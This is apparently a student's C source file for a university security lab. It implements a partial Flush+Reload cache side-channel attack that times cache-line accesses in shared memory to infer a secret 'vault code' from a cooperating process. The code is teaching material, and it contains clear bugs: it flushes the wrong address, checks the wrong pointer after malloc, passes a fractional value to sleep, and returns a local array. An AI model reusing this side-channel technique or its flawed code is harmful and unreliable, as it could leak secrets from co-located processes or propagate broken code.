/**
 * 
 * CMU 15-799 Security for Software and Hardware Systems Spring 2023
 * 
 *  thief.c is the attacker implementation. You need to add the code for 
 *  flush_reload().
 * 
 */

#include "util.h"
#include "params.h"
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>

#define SHARED_ID "CHANNEL"


// flush and reload should be straight forward
// you can traverse the buffer and use the utility functions
// to flush lines and perform the reload step.
int* flush_reload(int size, uint8_t *buf) {
    /*
        Create an array that can fit the buf,
        to be used as a list of access times (given as uint32_t by measure_line_time_access) 
        recorded for each uint8_t (8 bytes) in buf.
    */
    uint32_t* access_times = (uint32_t*) malloc(size * sizeof(uint32_t));
    if(access_times == NULL) {
        // Handle error: malloc failed to allocate memory
        printf("malloc failed to allocate memory");
    }

    /* Second access times array for measuring Delta. */
    uint32_t* access_times_2 = (uint32_t*) malloc(size * sizeof(uint32_t));
    if(access_times == NULL) {
        // Handle error: malloc failed to allocate memory
        printf("malloc failed to allocate memory");
    }

    /* 
        Wrap the buf into a uint64_t array;
        Initially done to just fit into clflush(uint64_t), but
        later theorized that buf must be arranged into 64 byte lines
        which is the line size of my cache. 
    */
    uint64_t *b = &buf;
    int i = 0;
    
    /* traverse the buffer */
    for (; i < size; i++) {
        /* Pointer to a line (64 bytes containing previous uint8_t) in buf*/
        uint64_t *p = &buf[i];
        /* Flush the whole buffer, instead of pointer. Makes for less noise. */
        clflush(b); 

        /* Wait for vault to access the value at vault_code, which is in one of the lines we are iterating over. */
        sleep(0.5); // Play with this to make sure you wait enough time for vault to finish 
        
        /* Immediately after flush, it should take longer (or normal times) to access, or it was accessed by vault.*/
        access_times[i] = measure_line_access_time(p); // longer access time -> No access; slower access time -> access occured
        access_times_2[i] = measure_line_access_time(p); // slower access time is guaranteed
    }
    
    // // TODO: create csv file representing (x,y) where x is the 
    // //       Array index and y is the Latency (Cycles).
    
    /* 
        Initializing variables used later in forloop:
            anomaly_count: count of anomalous access times
            anomalous_indeces: collection of indeces (or lines) with anomalous access times
            anomalous_deltas: collection access times of anomalous indeces (or lines)
    */
    int anomaly_count = 0; 
    int anomalous_indeces[900]; // reasons for choosing 900 explained below.
    int anomalous_deltas[900];
 
    /* For each access time that was measured from buf's indeces. */
    for (int j = 0; j < size; j++) {   
        /* 
            If access_time at j is anomalous. 
            
            Most accesses will have similar access_times when vault is not running and no accesses occur.
            When this code is running alone, without vault running in parallel, it will show that most
            accesses will take 36 or 72 cycles. 
            
            We have defined a typical access_time to be 36 or 72 cycles, 
            for both access_times (slow or fast) and access_times_2 (always fast);
            i.e. whether the vault is running or not and with/without cflush command,
            we observed most access time measures per line (index in array) to either be 36 or 72 cycles.

            An anomalous access_time is outside the defined typical cycle. 
            We encounter less than 900 anomalous access_times over 90% of the time.

            To see this, simply comment out the clflush command above and simply run this print statement: 
            printf("%d\n",access_times_2[j]); // Print all access times for all lines in buf.

        */
        if (access_times[j] != 36 && access_times[j] != 72) {
            
            /*  
                d will be positive and out of typical bounds, if no access.  i.e:
                        d = (longer - slower) = positive int means no access
                
                d will be 0 or maybe negative, if there was access. i.e:
                        d = (slower - slower) = 0 or negative int means access.
                
                The latter condition will be checked later to filter noise from the actual accesses,
                by identifying which indeces had the lowest delta. The index with the lowest delta,
                is probably vault_code.
            */ 
            int d = access_times[j] - access_times_2[j]; 
            
            /*  
                For the purpose stated above, 
                we store both the delta and all the index at which the anomalous access time occured at. 
            */
            // printf("\nAnomaly #%d:", anomaly_count);
            anomalous_indeces[anomaly_count] = j;
            anomalous_deltas[anomaly_count] = d;

            /* Print the number of anomalous indeces in buf, the anomaly delta and the index at which the anomaly occured. */
            // printf("\n     Access Time (Cycles): %d          Index: %d\n",  d, j);

            anomaly_count++; // increment anomaly count.
        }
    }

    /* Print errors found */
    // for (int j = 0; j < error_count; j++) {
    //     if (error_indeces[j] > 0) {
    //         printf("Error found in array #%d: %d\n",j, error_indeces[j]);
    //     }
    // }

    

    int lowest = -1;
    int index_lowest = -1;
    // Find index of lowest access_time in delta (should be a large negative number)
    for (int k = 0; k < anomaly_count; k++) {
        if (anomalous_deltas[k] <= lowest) {
            lowest = anomalous_deltas[k];
            index_lowest = anomalous_indeces[k];
        }
    }

    
    printf("\nlowest delta access time was %d at index %d\n", lowest, index_lowest);

    // Return a list of indeces that were 
    return anomalous_indeces;
}

int main(int argc, char const *argv[]) {
    int fd;
    fd = shm_open(SHARED_ID, O_CREAT | O_RDWR, S_IRUSR | S_IWUSR);
    if (fd == -1){
	printf("shm_open error\n");
	exit(1);
    }

    // allocating a SHARED memory region of size 2MB (4096 * 512 bytes)
    // and a pointer to the start of the region is stored in the buf variable
    // which is declared as a pointer to an unsigned 8-bit integer (uint8_t).
    // vault.c has similar code, so the L1/L2 caches of the thief and vault processes
    // will overlap, when ran in the same core.
    int buf_size = 4096 * 512;
    uint8_t *buf;
    if ((buf = (uint8_t *)mmap(
           NULL, buf_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0)) == MAP_FAILED) {
        printf("mmap error\n");
        printf("%d\n",errno);
        exit(1);
    }
    

    // you may need to add repetitions  

    // Create array of counts. Each index will start with 0.
    
    // run flush_reload multiple times (100 samples), 
    // Each time iterate over every i in the returned array of indeces
    // Increment the value of array of counts at index i
    // The vault_code should be the index with the highest count of 
	flush_reload(buf_size, buf);
    
    //print the key code and access time in the following  form
    // printf("Vault code: %d (%d)\n", key_code, latency);
    return 0;
 }
